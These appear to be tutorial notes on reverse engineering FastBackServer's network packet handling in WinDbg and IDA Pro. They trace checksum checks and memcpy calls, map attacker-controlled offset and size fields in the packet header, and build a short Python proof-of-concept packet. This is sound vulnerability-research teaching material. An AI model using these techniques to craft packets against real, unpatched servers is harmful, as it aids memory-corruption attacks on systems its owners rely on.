```
Evaluate expression:
  Hex:     41414141
  Decimal: 1094795585
  Octal:   10120240501
  Binary:  01000001 01000001 01000001 01000001
  Chars:   AAAA
```

The highest bit in the binary representation of `0x41414141` is 0. => A positive value in a signed arithmetic operation.

The `CMP` instruction subtracts the second operand from the first, in our case `0` from our input DWORD `0x41414141`.

- The result of this operation is still `0x41414141`.

- `0x41414141` has the sign bit unset => the `SF` won't be set.

- Since `0` and `0x41414141` both have positive signs, the `OF` flag won't be set either.

(`OF` flag is set when the **sign** bit is changed as the result of adding two numbers with the same sign or subtracting two numbers with opposite signs.)

The `JL` is taken only if the Sign flag and the Overflow flag are different.

=> `JL` is not taken.

```nasm
mov     ecx,dword ptr [ebp+8]
cmp dword ptr [ecx+4438h],100000h
jbe     FastBackServer!FX_AGENT_CopyReceiveBuff+0x1b0
```

The `JBE` jump is taken if the 1st operand is less than or equal to the 2nd and it's an **unsigned** operation.

The instruction checks if the Carry flag (`CF`) or the Zero flag (`ZF`) are set by the `CMP` instruction preceding the jump.

- Our DWORD would have to contain the value `0x100000` to set the Zero flag, or a smaller value to set the Carry flag.

=> If we want to take this jump, our DWORD needs to be <= `0x100000`.

Note: 

- "above" (JA, JAE) and "below" (JB, JBE) in conditional jumps are used while comparing unsigned integers.

- "less" (JL, JLE) and "greater" (JG, JGE) are used for comparisons of signed integers.

```
FastBackServer!FX_AGENT_CopyReceiveBuff+0x19d:
005817d3 81b93844000000001000 cmp dword ptr [ecx+4438h],100000h ds:0023:050fc458=41414141
```

`p`

```
FastBackServer!FX_AGENT_CopyReceiveBuff+0x1a7:
005817dd 7607            jbe     FastBackServer!FX_AGENT_CopyReceiveBuff+0x1b0 (005817e6) [br=0]
```

The `JBE` is not going to be taken because our input value of `0x41414141` > `0x100000`.

Notice:

- The `JBE` would take us toward the bottom left, while most of the code is on the bottom right.

- The code on the right includes a `memcpy` call that might be worth investigating.

- The second-to-last basic block on this execution path on the right: moving the value `1` into `EAX`. 

=> To analyze the `memcpy` and return successfully from this function, take the `JBE` at `0x5817DD`.

To trigger the `JBE`, update our PoC and set the DWORD value to `0x1234`, which is < `0x100000`.

The endianness of our first DWORD is inverted before being parsed. =>  Supply the value as **big-endian** in our Python code to obtain the correct format inside the application.

```python
import socket
import sys
from struct import pack

buf = pack(">i", 0x1234)
buf += bytearray([0x41]*100)
...
```

The `pack` function accepts 2 arguments: a format string and the value to pack.

- `>` character for big endian

- `i` character for 32-bit integer in the format string argument.

Remove our existing breakpoints in WinDbg and set a new breakpoint on the comparison against `0x100000`:

`bc *`

`bp FastBackServer!FX_AGENT_CopyReceiveBuff+0x19d`

`g`

```
FastBackServer!FX_AGENT_CopyReceiveBuff+0x19d:
005817d3 81b93844000000001000 cmp dword ptr [ecx+4438h],100000h ds:0023:00dfc458=00001234
```

`p`

```
FastBackServer!FX_AGENT_CopyReceiveBuff+0x1a7:
005817dd 7607            jbe     FastBackServer!FX_AGENT_CopyReceiveBuff+0x1b0 (005817e6) [br=1]
```

The jump will be taken this time.

Recap: The 1st DWORD is checked in little-endian format and must be between `0` and `0x100000`.

The 1st DWORD is found again in a basic block a bit further down (`0x58181A`)
 
```nasm
mov     edx,dword ptr [ebp+8]
mov     eax,dword ptr [edx+4438h]
add     eax,dword ptr [FastBackServer!FX_AGENT_dwHeaderLength (0085eb90)]
mov     edx,dword ptr [ebp+8]
sub     eax,dword ptr [edx+20h]
cmp     ecx,eax
jae     FastBackServer!FX_AGENT_CopyReceiveBuff+0x20b (00581841)
```

```
ecx=00000064
0058181a 8b8238440000    mov     eax,dword ptr [edx+4438h] ds:0023:00dfc458=00001234
```

`p`

```
FastBackServer!FX_AGENT_CopyReceiveBuff+0x1ea:
00581820 030590eb8500    add     eax,dword ptr [FastBackServer!FX_AGENT_dwHeaderLength (0085eb90)] ds:0023:0085eb90=00000004
```

`p`

```
FastBackServer!FX_AGENT_CopyReceiveBuff+0x1f0:
00581826 8b5508          mov     edx,dword ptr [ebp+8] ss:0023:0dc5feb8=00df8020
```

`p`

```
FastBackServer!FX_AGENT_CopyReceiveBuff+0x1f3:
00581829 2b4220          sub     eax,dword ptr [edx+20h] ds:0023:00df8040=00000004
```

The contents of the `FX_AGENT_dwHeaderLength` global variable are added to our DWORD, followed by a subtraction of the 4-byte value stored at offset `0x20` from `EDX`. Both of these values are `4` => not change the value of our input DWORD.

`p`

```
ecx=00000064
FastBackServer!FX_AGENT_CopyReceiveBuff+0x1f6:
0058182c 3bc8            cmp     ecx,eax
```

`r eax`

```
eax=00001234
```

At the end of the execution, a comparison between our first `0x1234` DWORD and the value `0x64`.

The input length of the rest of the buffer is `0x64` bytes (decimal `100`)

=> The application seems to be comparing the 1st DWORD of our data with the size of our input buffer, not counting the 1st DWORD.

=> Assume that the value of the 1st DWORD must match the size of the input buffer and acts as a basic checksum to verify that all data was received by the application.

A complete analysis of this function and its parent would reveal that the application can handle **fragmented TCP packets**.

In theory, we could use a checksum value that differs from the total size of the data sent in the packet. This would require the use of fragmented TCP packets, however, which would complicate the analysis.

Update our PoC by setting the first DWORD to `0x64`, remove all the breakpoints, and set a new breakpoint at the comparison performed.

```python
import socket
import sys
from struct import pack

buf = pack(">i", 0x64)
buf += bytearray([0x41]*100)
...
```

`bc *`

`bp FastBackServer!FX_AGENT_CopyReceiveBuff+0x1f6`

`g`

```
Breakpoint 0 hit
eax=00000064 ecx=00000064
FastBackServer!FX_AGENT_CopyReceiveBuff+0x1f6:
0058182c 3bc8            cmp     ecx,eax
```

The breakpoint was hit + the 1st DWORD to match the size of the input buffer. 

```nasm
mov     eax,dword ptr [ebp+8]
mov     ecx,dword ptr [eax+4438h]
add     ecx,dword ptr [FastBackServer!FX_AGENT_dwHeaderLength]
mov     edx,dword ptr [ebp+8]
sub     ecx,dword ptr [edx+20h]
mov     dword ptr [ebp-10h],ecx
```

The value stored in the `FX_AGENT_dwHeaderLength` global variable is first added to our DWORD. Next, the DWORD stored at offset `0x20` from `EDX` is subtracted. These values haven't changed from the previous block, and they have no net effect on our DWORD.

At the end of the basic block, our DWORD is saved to a stack address, to track that address instead of the one at offset `0x4438`.

The value stored on the stack is immediately used in the next basic block

```nasm
mov     eax,dword ptr [ebp-10h]
mov     dword ptr [ebp-4],eax
mov     ecx,dword ptr [ebp-4]
push    ecx
mov     edx,dword ptr [ebp+8]
mov     eax,dword ptr [edx+2Ch]
mov     ecx,dword ptr [ebp+8]
lea     edx,[ecx+eax+38h]
push    edx
mov     eax,dword ptr [ebp+8]
mov     ecx,dword ptr [eax+20h]
mov     edx,dword ptr [ebp+8]
lea     eax,[edx+ecx+4438h]
push    eax
call    FastBackServer!memcpy (00666e40)
add     esp,0Ch
mov     ecx,dword ptr [ebp+8]
```
 
Another `memcpy` is performed in this block.

```
FastBackServer!FX_AGENT_CopyReceiveBuff+0x24c:
00581882 e8b9550e00      call    FastBackServer!memcpy (00666e40)
```

`dd esp L3`

```
0dd5fe94  050fc45c 050f805c 00000064
```

Our 1st DWORD is used as the `size` parameter of `memcpy` (`ecx`).

`dd 050f805c`

```
050f805c  41414141 41414141 41414141 41414141
050f806c  41414141 41414141 41414141 41414141
050f807c  41414141 41414141 41414141 41414141
050f808c  41414141 41414141 41414141 41414141
050f809c  41414141 41414141 41414141 41414141
050f80ac  41414141 41414141 41414141 41414141
050f80bc  41414141 00000000 00000000 00000000
050f80cc  00000000 00000000 00000000 00000000
```

`dd 050f805c - 4 L1`

```
050f8058  64000000
```

The second argument (`0x050f805c`) points to our input buffer.

=> Our input buffer, excluding the first DWORD, is going to be copied into another buffer. This new buffer will next be processed by the application.

Step over the `memcpy` call to continue to the second-to-last basic block

```nasm
mov     eax,1
```

Recap:

- The first DWORD must be sent in big-endian format and be equal to the size of the rest of the buffer.

- After successful validation, the input buffer is copied for further processing.


## Reverse Engineering the Protocol

### Header-Data Separation

The `FX_AGENT_CopyReceiveBuff` function verifies the 1st DWORD as a checksum and copies the remainder of the input buffer into a new location.

Then the function sets the result value in EAX to `1` and returns.

`pt`

```
eax=00000001
FastBackServer!FX_AGENT_CopyReceiveBuff+0x29c:
005818d2 c3              ret
```

`p`

```
eax=00000001
FastBackServer!FX_AGENT_GetData+0xd:
005815d3 83c404          add     esp,4
```

The function we return into is called `FX_AGENT_GetData`.

```nasm
add     esp,4
mov     dword ptr [ebp-4],eax
cmp     dword ptr [ebp-4],0
jnz     FastBackServer!FX_AGENT_GetData+0x4e (00581614)
```

The return value saved in `EAX` (`1`) is compared against `0`

=> The `JNZ` jump will be taken.

```nasm
mov     eax,dword ptr [ebp+8]
push    eax
call    FastBackServer!FX_AGENT_CheckPacketIsComplete (005818d3)
add     esp,4
mov     dword ptr [ebp-4],eax
cmp     dword ptr [ebp-4],0
jz      FastBackServer!FX_AGENT_GetData+0x6a (00581630)  
```

A call to `FX_AGENT_CheckPacketIsComplete`. Given the name, guess that the function will validate that our packet is complete, i.e. All the data has been received.

The call to the `recv` API in `wsock32.dll` is used with a hardcoded size of `0x4400` bytes.

=> Any packet we send that is < `0x4400` bytes will be completely received and the call to `FX_AGENT_CheckPacketIsComplete` should return TRUE, or `1`.

```
FastBackServer!FX_AGENT_GetData+0x52:
00581618 e8b6020000      call    FastBackServer!FX_AGENT_CheckPacketIsComplete
```

`p`

```
eax=00000001
FastBackServer!FX_AGENT_GetData+0x57:
0058161d 83c404          add     esp,4
```

`EAX` was set to `1`. Then, the return value is compared to `0`.

```nasm
add     esp,4
mov     dword ptr [ebp-4],eax
cmp     dword ptr [ebp-4],0
jz      FastBackServer!FX_AGENT_GetData+0x6a (00581630)  
```

The subsequent `JZ` jump is not taken.

```nasm
mov     eax, 1
jmp     FastBackServer!FX_AGENT_GetData+0x6c (00581632)
```

Here, `FX_AGENT_GetData` completes its execution.

```nasm
mov     esp,ebp
pop     ebp
ret
```

Assume that the application will next process the input data received.

`pt`

```
FastBackServer!FX_AGENT_GetData+0x6f:
00581635 c3              ret
```

`p`

```
eax=00000001
FastBackServer!FX_AGENT_Cyclic+0xd0:
00581320 83c404          add     esp,4
```

We have returned into the `FX_AGENT_Cyclic` function.

```nasm
mov     dword ptr [ebp-4],eax
cmp     dword ptr [ebp-4],0
jz      FastBackServer!FX_AGENT_Cyclic+0x13c
```

There is a comparison between the return value of "1" and "0"

=> The `JZ` will **not** be taken and execution will flow to:

```nasm
mov     edx,dword ptr [ebp+8] ss:0023:0d83fef8=04f96020
cmp     dword ptr [edx+4438h],0
jnz     FastBackServer!FX_AGENT_Cyclic+0xf7
```

A comparison between a DWORD at offset `0x4438` from `EDX` and `0` - the same static offset value that was used to store the checksum in the `FX_AGENT_CopyReceiveBuff` function.

```
FastBackServer!FX_AGENT_Cyclic+0xdf:
0058132f 83ba3844000000  cmp     dword ptr [edx+4438h],0 ds:0023:04ffe458=00000064
```

The `JNZ` is going to be taken.

```nasm
push    1
mov     eax,dword ptr [ebp+8]
mov     ecx,dword ptr [eax+4438h]
push    ecx
mov     edx,dword ptr [ebp+8]
add     edx,443Ch
push    edx
mov     eax,dword ptr [ebp+8]
push    eax
call    FastBackServer!FXCLI_C_ReceiveCommand (0056a0ef)
```

The basic block calls into the `FXCLI_C_ReceiveCommand` function.
 
This function name suggests that our input buffer will be used as part of some application functionality.

Observe the arguments being pushed to the stack.

1. The static value `1`, followed by the DWORD at offset `0x4438`, which is the checksum value.

2. Use dynamic analysis to dump the last two arguments from the stack:

```
FastBackServer!FX_AGENT_Cyclic+0x111:
00581361 e8898dfeff      call    FastBackServer!FXCLI_C_ReceiveCommand (0056a0ef)
```

`dd esp L4`

```
0df0febc  04ffa020 04ffe45c 00000064 00000001
```

`dd 04ffa020`

```
04ffa020  0096a318 0096a318 00000000 00000b10
04ffa030  7ece0002 90b0a8c0 00000000 00000000
04ffa040  00000068 00000000 00000000 00000000
04ffa050  00000b14 00000001 64000000 41414141
04ffa060  41414141 41414141 41414141 41414141
04ffa070  41414141 41414141 41414141 41414141
04ffa080  41414141 41414141 41414141 41414141
04ffa090  41414141 41414141 41414141 41414141
```

The 1st address seems to contain the original packet we sent, along with its stored meta information.

`dd 04ffe45c`

```
04ffe45c  41414141 41414141 41414141 41414141
04ffe46c  41414141 41414141 41414141 41414141
04ffe47c  41414141 41414141 41414141 41414141
04ffe48c  41414141 41414141 41414141 41414141
04ffe49c  41414141 41414141 41414141 41414141
04ffe4ac  41414141 41414141 41414141 41414141
04ffe4bc  41414141 00000000 00000000 00000000
04ffe4cc  00000000 00000000 00000000 00000000
```

The 2nd memory address seems to contain the input buffer after it is copied to the new memory location.

Before analyzing the content of the function in detail, examine `FXCLI_C_ReceiveCommand` at a high level using the `Graph` overview:

- Multiple branching statements, with the larger basic blocks continuing on the right of the layout.

=> Any important application functionality will be found at the bottom-right side of the graph overview, anything else is a failure condition.

This is confirmed by the basic blocks located at the bottom-left of the function at the addresses `0x056A1A8`, `0x056A144`, and `0x056A11A`, which contain error messages.

Go back to first basic block of `FXCLI_C_ReceiveCommand`:

```nasm
push    ebp
mov     ebp,esp
sub     esp,0Ch
mov     eax,dword ptr [ebp+0Ch]
mov     dword ptr [ebp-8],eax
mov     dword ptr [ebp-0Ch],0
cmp     dword ptr [ebp+10h],30h
jz      FastBackServer!FXCLI_C_ReceiveCommand+0xa3 (0056a192)
```

We find a comparison between the 3rd argument (the checksum value) and the static value `0x30`.

It's the 3rd argument because of the `arg_8` offset labeled (`ebp+10h`)

IDA Pro labels the function arguments using:

- `arg_0` for the first argument
- `arg_4` for the second argument
- `arg_8` for the third argument, ...

The checksum value will not be equal to `0x30` and the `JZ` is not going to be taken.

The next basic block does an upper-bound check on the packet size by comparing the checksum value to `0x186A0`:
 
```nasm
mov     ecx,dword ptr [ebp+10h] ss:0023:0d83fec4=00000064
sub     ecx,30h
cmp     ecx,186A0h
jbe     FastBackServer!FXCLI_C_ReceiveCommand+0x3f
```

As long as our packet size < `0x186A0`, we will trigger the `JBE` and proceed to the next basic block, which is what we want to do:

```nasm
push    offset FastBackServer!FXCLI_IF_sAgentsCommandsBufferMemoryPool (0096a320)
call    FastBackServer!MEM_S_GetChunk
add     esp,4
mov     dword ptr [ebp-0Ch],eax
cmp     dword ptr [ebp-0Ch],0
jnz     FastBackServer!FXCLI_C_ReceiveCommand+0x69
```
 
After the `JBE`, the application performs a call to `MEM_S_GetChunk`.

We find that it does not accept any arguments we control => guess that it is not important to reverse engineer.

After the call, the return value is saved on the stack at the offset labeled `Dst` (`-0Ch`).

Due to its name, we suspect that the `MEM_S_GetChunk` function is a memory allocator wrapper used here for the destination buffer.

Inspect the failure branch for this basic block:

```nasm
push    offset FastBackServer!FX_CLI_JavaVersion+0x2e0 (008568f8)
call    FastBackServer!PrintToTrace (0048c471)
```
 
Double-click on the error command that will be printed by the application to reach its address in memory and inspect it:

```
$SG125464       db 'FXCLI_C_ReceiveCommand: Sorry, cant get psCommandBuffer ',0Ah,0
                ; DATA XREF: _FXCLI_C_ReceiveCommand+55↑o
```
 
=> `MEM_S_GetChunk` acts as an allocator and the newly-allocated buffer is named `psCommandBuffer`.

A comparison with `0` checks if the `psCommandBuffer` was successfully allocated.
 
We have no reason to believe that it will fail, so the `JNZ` should be triggered:

```nasm
push    186A4h
push    0
mov     edx,dword ptr [ebp-0Ch]
push    edx
call    FastBackServer!memset (00667180)
add     esp,0Ch
mov     eax,dword ptr [ebp+10h]
sub     eax,30h
mov     ecx,dword ptr [ebp-0Ch]
mov     dword ptr [ecx],eax
mov     edx,dword ptr [ebp-0Ch]
mov     eax,dword ptr [edx]
push    eax
mov     ecx,dword ptr [ebp+0Ch]
add     ecx,30h
push    ecx
mov     edx,dword ptr [ebp-0Ch]
add     edx,4
push    edx
call    FastBackServer!memcpy (00666e40)
add     esp,0Ch
```

2 API calls in this basic block: `memset` and `memcpy`.

- `Memset` is a common API that sets all bytes of a buffer to a specific value

=> `psCommandBuffer` will have all its bytes set to `0` and from the `memset` 3rd argument, its size seems to be `0x186A4`.

This type of memory initialization is often used to remove any previous content in the buffer before it's used. If initialization is not performed, it may be possible to exploit it in a vulnerability class called **uninitialized memory use**.

- The `memcpy` API performs a copy operation.

Move the execution to just before the `memcpy` call.

```
0056a18a e8b1cc0f00      call    FastBackServer!memcpy (00666e40)
```

`dd esp L3`

```
0df0fe9c  06facc0c 04ffe48c 00000034
```

`dd 04ffe48c-30`

```
04ffe45c  41414141 41414141 41414141 41414141
04ffe46c  41414141 41414141 41414141 41414141
04ffe47c  41414141 41414141 41414141 41414141
04ffe48c  41414141 41414141 41414141 41414141
04ffe49c  41414141 41414141 41414141 41414141
04ffe4ac  41414141 41414141 41414141 41414141
04ffe4bc  41414141 00000000 00000000 00000000
04ffe4cc  00000000 00000000 00000000 00000000
```

The two instructions (`mov eax, [ebp+10h], sub eax, 30h`)

=> The `size` parameter = Our checksum value (`0x64`) - `0x30`.

From the second argument, we find that the source buffer is our input buffer starting at offset `0x30`.

=> This use of a static offset into the buffer typically indicates a separation between a header and content data.

At this point, we can assume that our packet has the structure:

- 0x00 - 0x04: Checksum DWORD
- 0x04 - 0x34: Packet header
- 0x34 - End:  psCommandBuffer

In the next basic block , we find another call to `MEM_S_GetChunk`, which was the allocator used for `psCommandBuffer`.

```nasm
add     esp,0Ch
push    offset FastBackServer!FXCLI_IF_sAgentCommandsMemoryPool (0096a5a0)
call    FastBackServer!MEM_S_GetChunk (0048631b)
add     esp,4
mov     dword ptr [ebp-8],eax
cmp     dword ptr [ebp-8],0
jnz     FastBackServer!FXCLI_C_ReceiveCommand+0xca (0056a1b9)
```

Once again, we do not control the allocation size so we can skip stepping into the call.

This time, if `MEM_S_GetChunk` fails, we end up reaching another failure block with the error message:

```
$SG125471       db 'FXCLI_C_ReceiveCommand: Sorry can',27h,'t allocate psAgentCommand'
                ; DATA XREF: _FXCLI_C_ReceiveCommand+B9↑o
                db 0Ah,0
```
 
=> This buffer is named "`psAgentCommand`".

If the allocation succeeds, this new buffer is used in the next basic block where we find another copy operation through `memcpy`:

```nasm
push    30h
mov     eax,dword ptr [ebp+0Ch]
push    eax
mov     ecx,dword ptr [ebp-8]
push    ecx
call    FastBackServer!memcpy
add     esp,0Ch
mov     edx,dword ptr [ebp-8]
mov     eax,dword ptr [ebp-0Ch]
mov     dword ptr [edx+2Ch],eax
mov     ecx,dword ptr [FastBackServer!FXCLI_sMessageQueue]
push    ecx
call    FastBackServer!MSGQ_S_GetChunkForMessage
add     esp,4
mov     dword ptr [ebp-4],eax
cmp     dword ptr [ebp-4],0
jnz     FastBackServer!FXCLI_C_ReceiveCommand+0x101
```
 
The size of the copy operation is `0x30` bytes, which matches our estimate of the packet header size.

The memory copy starts at the beginning of our input buffer (`move eax, [ebp+0Ch], push eax`).

Update the packet structure with these new buffer names:

- 0x00 - 0x04: Checksum DWORD
- 0x04 - 0x34: psAgentCommand
- 0x34 - End:  psCommandBuffer

A call to `MSGQ_S_GetChunkForMessage` is issued after the `mempy` operation. This function does not accept any arguments under our control, so skip it for now.

The next basic block contains a call to the `FXCLI_OraBR_Exec_Command` function.

```nasm
mov     edx,dword ptr [ebp-4]
mov     eax,dword ptr [ebp-8]
mov     dword ptr [edx+0Ch],eax
mov     ecx,dword ptr [ebp-4]
mov     edx,dword ptr [ebp+8]
mov     dword ptr [ecx+4],edx
mov     eax,dword ptr [ebp-4]
mov     ecx,dword ptr [ebp+14h]
mov     dword ptr [eax+8],ecx
mov     edx,dword ptr [ebp-8]
mov     eax,dword ptr [ebp+8]
mov     dword ptr [edx+8],eax
push    1
mov     ecx,dword ptr [ebp-4]
push    ecx
call    FastBackServer!FXCLI_OraBR_Exec_Command (0056c4b6)
```

### Reversing the Header

Analyze the` FXCLI_OraBR_Exec_Command` function.

When we attempt to examine this function in IDA Pro, we receive an  error because, by default, IDA Pro will only display functions in `graph` mode with a maximum of `1000` basic blocks or nodes.

`FXCLI_OraBR_Exec_Command` is a very large function.

Increase the maximum number of nodes per function: Navigate to `Options > General` and the `Graph` tab to change the `Max number of nodes` to `10000`.
 
Press `Space` to switch back to `graph` view:
 
- Functions like `FXCLI_OraBR_Exec_Command `are written through a multitude of if, else, and switch statements.

- The evaluation of these conditional statements is commonly based on single or multiple values usually stored in the **packet header**. These values are often referred to **opcodes**.

Generally, when we're reverse engineering to locate vulnerabilities, functions with a huge amount of branches like `FXCLI_OraBR_Exec_Command` are the ones we want to locate and trigger from our network packet.

Reverse engineer the top part of the function to gain a better understanding of how the `psAgentCommand` and `psCommandBuffer` buffers are used.

To easily **trace our input** inside the function, update our PoC so that the `psAgentCommand` section consists of `0x41` bytes and the `psCommandBuffer` section consists of `0x42` bytes

```python
...
buf = pack(">i", 0x64)
buf += bytearray([0x41]*0x30)
buf += bytearray([0x42]*0x34)
...
```

Remove any existing breakpoints, set a breakpoint on `FXCLI_OraBR_Exec_Command`, and send a new packet using our updated PoC:

`bc *`

`bp FastBackServer!FXCLI_OraBR_Exec_Command`

`g`

```
Breakpoint 0 hit
FastBackServer!FXCLI_OraBR_Exec_Command:
0056c4b6 55              push    ebp
```

The prologue of `FXCLI_OraBR_Exec_Command` is very large, but if we continue to single step through instructions, we will eventually reach a comparison using a DWORD from the `psAgentCommand` header:

```
eax=062fc890 ecx=062fc880
FastBackServer!FXCLI_OraBR_Exec_Command+0x375:
0056c82b 817804a8610000  cmp     dword ptr [eax+4],61A8h ds:0023:062fc894=41414141
```

`dd eax-20 L10`

```
062fc870  00000000 00000000 00000000 00000000
062fc880  41414141 41414141 0d42b020 41414141
062fc890  41414141 41414141 41414141 41414141
062fc8a0  41414141 41414141 41414141 072b4c08
```

This is the `psAgentCommand` buffer because it has our `0x41` bytes.

The comparison (`cmp dword ptr [eax+4],61A8h`) is performed at an offset of `4` from the `EAX` register, which points to `0x062fc890`.

`psAgentCommand` starts at `0x062fc880`

=> The DWORD compared with the static value `61A8h` is located at offset `0x14` from the beginning of the `psAgentCommand` buffer.

Notice that the content of `ECX` originates from `EBP+var_C370` (`ebp-0C370h`):

```nasm
mov     ecx,dword ptr [ebp-0C370h]
mov     edx,dword ptr [ecx+2Ch]
add     edx,4
mov     dword ptr [ebp-61B0h],edx
mov     eax,dword ptr [ebp-61B4h]
cmp     dword ptr [eax+4],61A8h ds:0023:05f4d7f4=41414141
jnb     FastBackServer!FXCLI_OraBR_Exec_Command+0x39c
```
 
- `EBP+var_C370` (`ebp-0C370h`) contains the address of the `psAgentCommand` buffer

- `EBP+var_61B4` (`ebp-61B4h`) contains the address of the `psAgentCommand` buffer plus `0x10` bytes.

To ease our reverse engineering, **rename** the `var_C370` to "`psAgentCommand`" and `var_61B4` to "`psAgentCommand_0x10`".

If the subsequent `JNB` (`JAE`) is triggered, the execution leads to a failure statement with the message:

```
$SG126209       db 'FXCLI_OraBR_Exec_Command: buffer size mismatch, posible buffer ov'
                ; DATA XREF: _FXCLI_OraBR_Exec_Command+3F7↑o
                db 'errun attack',0Ah,0
```

This indicates that this DWORD must < `0x61A8`.

Speed up our reverse engineering process by modifying the compared DWORD in memory to avoid the failure statement.

Change the DWORD to `0x1000`, an arbitrary value smaller than `0x61A8`.

`ed eax+4 1000`

`r`

```
eax=062fc890
FastBackServer!FXCLI_OraBR_Exec_Command+0x375:
0056c82b 817804a8610000  cmp     dword ptr [eax+4],61A8h ds:0023:062fc894=00001000
```

When the comparison is performed, the conditional jump is not taken.

`p`

```
FastBackServer!FXCLI_OraBR_Exec_Command+0x37c:
0056c832 731e            jae     FastBackServer!FXCLI_OraBR_Exec_Command+0x39c (0056c852) [br=0]
```

This kind of comparison between a DWORD in the buffer sent over the network and a static value, combined with the error message, suggests that:

- We are dealing with a length or size parameter.

- `0x61A8` is the upper limit for this parameter.

When we single-step to the next basic block:

```nasm
mov     ecx, [ebp+psAgentCommand_0x10]
cmp     dword ptr [ecx+0Ch], 61A8h
jnb     FastBackServer!FXCLI_OraBR_Exec_Command+0x39c (0056c852)
```
 
The DWORD at offset `0x1C` in the `psAgentCommand` buffer must also < `0x61A8`.

If we do not trigger the following conditional jump, we arrive at a third, similar check in a different basic block:

```nasm
mov     edx, [ebp+psAgentCommand_0x10]
cmp     dword ptr [edx+4], 61A8h
jb      FastBackServer!FXCLI_OraBR_Exec_Command+0x40f
```
 
The DWORD at offset `0x14` from the beginning of the `psAgentCommand` buffer must < the static value `0x61A8`.

Manually set the DWORD at offset `0x1C` to an arbitrary value below `0x61A8`. In this case, we choose `0x2000` and, execution continues past the last two comparisons:

`ed ecx+c 2000`

`r`

```
FastBackServer!FXCLI_OraBR_Exec_Command+0x384:
0056c83a 81790ca8610000  cmp     dword ptr [ecx+0Ch],61A8h ds:0023:062fc89c=00002000
```

`p`

```
FastBackServer!FXCLI_OraBR_Exec_Command+0x38b:
0056c841 730f            jae     FastBackServer!FXCLI_OraBR_Exec_Command+0x39c (0056c852) [br=0]
```

`p`

```
FastBackServer!FXCLI_OraBR_Exec_Command+0x38d:
0056c843 8b954c9effff    mov     edx,dword ptr [ebp-61B4h] ss:0023:0d739ce4=062fc890
```

`p`

```
FastBackServer!FXCLI_OraBR_Exec_Command+0x393:
0056c849 817a04a8610000  cmp     dword ptr [edx+4],61A8h ds:0023:062fc894=00001000
```

`p`

```
FastBackServer!FXCLI_OraBR_Exec_Command+0x39a:
0056c850 7273            jb      FastBackServer!FXCLI_OraBR_Exec_Command+0x40f (0056c8c5) [br=1]
```

The Jump below (`JB`) is going to take us to `loc_56C8C5` in IDA Pro since our value (`0x1000`) < `0x61A8`.

```nasm
mov     edx, [ebp+psAgentCommand_0x10]
cmp     dword ptr [edx+4], 0
jz      FastBackServer!FXCLI_OraBR_Exec_Command+0x454
```

A comparison between the DWORD we modified at offset `0x14` from the beginning of `psAgentCommand` and `0`.

Since we set this to `0x1000` we are going to pass this check and reach the next basic block

```nasm
mov     eax, [ebp+psAgentCommand_0x10]
mov     ecx, [eax+4]
push    ecx             ; Size
mov     edx, [ebp+psAgentCommand_0x10]
mov     eax, [ebp+var_61B0]
add     eax, [edx]
push    eax             ; Src
lea     ecx, [ebp+Dst]
push    ecx             ; Dst
call    _memcpy
add     esp, 0Ch
mov     edx, [ebp+psAgentCommand_0x10]
mov     eax, [edx+4]
mov     [ebp+eax+Dst], 0
```

This same value is copied to `ECX` and used as the `Size` parameter for the `memcpy` operation.

When C/C++ code is compiled into assembly, `ECX` is commonly used as a counter in string operations.

The `source` buffer parameter is a bit more complicated, analyze it dynamically in the debugger.

```
FastBackServer!FXCLI_OraBR_Exec_Command+0x42b:
0056c8e1 8b85509effff    mov     eax,dword ptr [ebp-61B0h] ss:0023:0d739ce8=072b4c0c
```

`p`

```
eax=072b4c0c edx=062fc890
FastBackServer!FXCLI_OraBR_Exec_Command+0x431:
0056c8e7 0302            add     eax,dword ptr [edx]  ds:0023:062fc890=41414141
```

`dd eax`

```
072b4c0c  42424242 42424242 42424242 42424242
072b4c1c  42424242 42424242 42424242 42424242
072b4c2c  42424242 42424242 42424242 42424242
072b4c3c  42424242 00000000 00000000 00000000
072b4c4c  00000000 00000000 00000000 00000000
072b4c5c  00000000 00000000 00000000 00000000
072b4c6c  00000000 00000000 00000000 00000000
072b4c7c  00000000 00000000 00000000 00000000
```

`dd edx LC`

```
062fc890  41414141 00001000 41414141 00002000
062fc8a0  41414141 41414141 41414141 072b4c08
062fc8b0  26b3980f 081d037f 4c435846 534d5f49
```

1. `EAX` contains the address of `psCommandBuffer`, our `0x42`'s. => the copy operation will use our input data.

The address of `psCommandBuffer` is stored in the variable `var_61B0` => rename that to "`psCommandBuffer`" inside IDA Pro.

2. The addition operation between the address stored in `EAX` (`psCommandBuffer` address) and the value `EDX` points to. This in effect modifies the starting address within `psCommandBuffer` for the copy operation.

By inspecting the content memory pointed to by `EDX`, we find that this DWORD is located at offset `0x10` from the beginning of our `psAgentCommand` buffer and therefore is under our control.

The copy operation is performed on our input data at an offset we control.

Let's use this to update our packet structure:

- 0x00       : Checksum DWORD
- 0x04 - 0x30: psAgentCommand
    - 0x04 - 0x10:  ??
    - 0x14:         Offset for copy operation
    - 0x18:         Size of copy operation
    - 0x1C - 0x30:  ??
- 0x34 - End:  psCommandBuffer


Moving forward, a basic block at address `0x0056C916` where another `memcpy` operation is performed:

```nasm
mov     edx, [ebp+psAgentCommand_0x10]
mov     eax, [edx+0Ch]
push    eax             ; Size
mov     ecx, [ebp+psAgentCommand_0x10]
mov     edx, [ebp+psCommandBuffer]
add     edx, [ecx+8]
push    edx             ; Src
lea     eax, [ebp+Src]
push    eax             ; Dst
call    _memcpy
add     esp, 0Ch
mov     ecx, [ebp+psAgentCommand_0x10]
mov     edx, [ecx+0Ch]
mov     [ebp+edx+Src], 0
```
 
The start of the copy into the source buffer is controlled by a value found at offset `0x18` from the beginning of the `psAgentCommand` buffer.

The size of the copy is still under our control, located at offset `0x1C` in the header.

At address `0x0056C95C`, we find yet another similar basic block containing a `memcpy` operation:

```nasm
mov     ecx, [ebp+psAgentCommand_0x10]
mov     edx, [ecx+14h]
push    edx             ; Size
mov     eax, [ebp+psAgentCommand_0x10]
mov     ecx, [ebp+psCommandBuffer]
add     ecx, [eax+10h]
push    ecx             ; Src
lea     edx, [ebp+Source]
push    edx             ; Dst
call    _memcpy
add     esp, 0Ch
mov     eax, [ebp+psAgentCommand_0x10]
mov     ecx, [eax+14h]
mov     [ebp+ecx+Source], 0
```
 
Our `psCommandBuffer` is again used as the source buffer.

In this case, the start of the copy is controlled by a value found at offset `0x20` from the beginning of the `psAgentCommand` buffer. The size of the copy is found at offset `0x24` in the header.

An updated packet structure based on this information:

- 0x00       : Checksum DWORD
- 0x04 - 0x30: psAgentCommand
    - 0x04 - 0x10:  ??
    - 0x14:         Offset for 1st copy operation
    - 0x18:         Size of 1st copy operation
